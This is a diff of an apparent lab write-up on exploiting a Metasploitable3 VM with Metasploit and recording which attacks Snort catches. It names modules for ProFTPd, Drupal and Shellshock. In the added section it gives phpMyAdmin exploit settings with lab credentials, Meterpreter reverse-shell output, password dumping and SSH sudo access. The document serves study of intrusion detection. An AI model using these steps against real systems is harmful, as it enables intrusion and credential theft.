@@ -9,7 +9,7 @@ First, we execute the basic Nmap command:
 
 nmap -sV 172.28.128.3
 
-We get the ports that are open and the services that are running, but we then try with a more in-depth analysis:
+We get the open ports and the services that are running, but we then try with a more in-depth analysis:
 
 sudo nmap -n -sS -sV -sC 172.28.128.3 -p0-65535 -T4 -A -O
 
@@ -17,7 +17,9 @@ With this command we perform an in-depth analysis of all the ports, the main dif
 
 The output of the command can be seen in the repository, since we have to stay within the word limit I will not include outputs here.
 
-Identified Attack 1: ProFTPd
+################################
+# Identified Attack 1: ProFTPd #
+################################
 
 Port 21 is open and running ProFTPd 1.3.5, so the first thing we do is search in Metasploit for scripts that match the service and version. From the list we select "exploit/unix/ftp/proftpd_modcopy_exec" due to its excellent rank and coincidence with version 1.3.5, we configure its options and run the exploit
 
@@ -33,7 +35,9 @@ Also, we can see that the attack was detected by Snort as a priority 1 attack:
 
 11/16-16:31:14.340657  [**] [1:1356:5] WEB-ATTACKS perl execution attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:40327 -> 172.28.128.3:80
 
-Identified attack 2: Drupal
+###############################
+# Identified attack 2: Drupal #
+###############################
 
 During the second Nmap scan, a folder named Drupal was discovered on port 80. Subsequently, an exploration into potential exploits for Drupal was initiated using the Metasploit framework:
 
@@ -54,7 +58,9 @@ From the VM, we can see that the attack was detected by Snort as a priority 1 at
 
 [**] [1:2012887:2] ET POLICY HTTP POST contains pass= in cleartext [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 172.28.128.1:43547 -> 172.28.128.3:80
 
-Identified attack 3: Apache
+###############################
+# Identified attack 3: Apache #
+###############################
 
 The Nmap scan reveals an open port 80 with the HTTP service, running Apache httpd version 2.4.7. A search for Apache exploits yields a plethora of options, so we refer to Google to find multi/http/apache_mod_cgi_bash_env_exec as a potential exploit. The configuration is very straightforward, and the exploit is executed:
 
@@ -76,3 +82,44 @@ From here, we try to list the files in the current directory and a file named "h
 The intrusion did not go unnoticed, as Snort detected the attack and logged it:
 
 11/19-22:04:30.702047  [**] [1:2022028:1] ET WEB_SERVER Possible CVE-2014-6271 Attempt [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 172.28.128.1:42371 -> 172.28.128.3:80
+
+###############################
+# Missed Attack 1: PHPMyAdmin #
+###############################
+
+Upon accessing the webpage at 172.28.128.3, a PHPMyAdmin page is identified. A search for PHPMyAdmin exploits in Metasploit reveals various options, with the chosen exploit being exploit/multi/http/phpmyadmin_preg_replace due to its excellent rank. Configuration involves setting the target IP (RHOSTS) and the known password, which if we recall from the first attack, we have the credentials (root:sploitme), then we execute the exploit:
+
+set RHOSTS 172.28.128.3
+set password sploitme
+exploit
+
+The exploit is executed successfully, resulting in a Meterpreter session:
+
+[*] Started reverse TCP handler on 192.168.0.104:4444 
+[*] phpMyAdmin version: 3.5.8
+[*] The target appears to be vulnerable.
+[*] Grabbing CSRF token...
+[+] Retrieved token
+[*] Authenticating...
+[+] Authentication successful
+[*] Sending stage (39927 bytes) to 192.168.0.104
+[*] Meterpreter session 5 opened (192.168.0.104:4444 -> 192.168.0.104:48186) at 2023-11-19 19:34:59 +0200
+
+Note that the exploit was not detected by Snort, as the attack was not logged, this may be due to the fact that we already had the credentials.
+
+We now know that the previously obtained credentials are working, thus we access the VM 172.28.128.3 from the browser and use these credentials to log into payroll_app.php which gives us a successful login but with no information. We also tried to log in with the credentials in the PHPMyAdmin page leading to a successful login.
+
+Further exploration of the PHPMyAdmin interface uncovers a database named Drupal with a table "users" containing hashed passwords. Additionally, within the MySQL database, a table "users" is found with a hashed root password. Although these hashes are stored for potential future cracking with a tool like John The Ripper. Lastly, we access the database payroll and table users which contains usernames and plain text passwords which can be used to log into the payroll_app.php page and get their information.
+
+An attempt to SSH into the machine using these credentials proves successful, providing a shell. Notably, users Leia, Luke, and Han have sudo privileges:
+
+leia_organa@metasploitable3-ub1404:~$ id
+uid=1111(leia_organa) gid=100(users) groups=100(users),27(sudo)
+
+This attack was not detected by Snort.
+
+
+
+
+
+
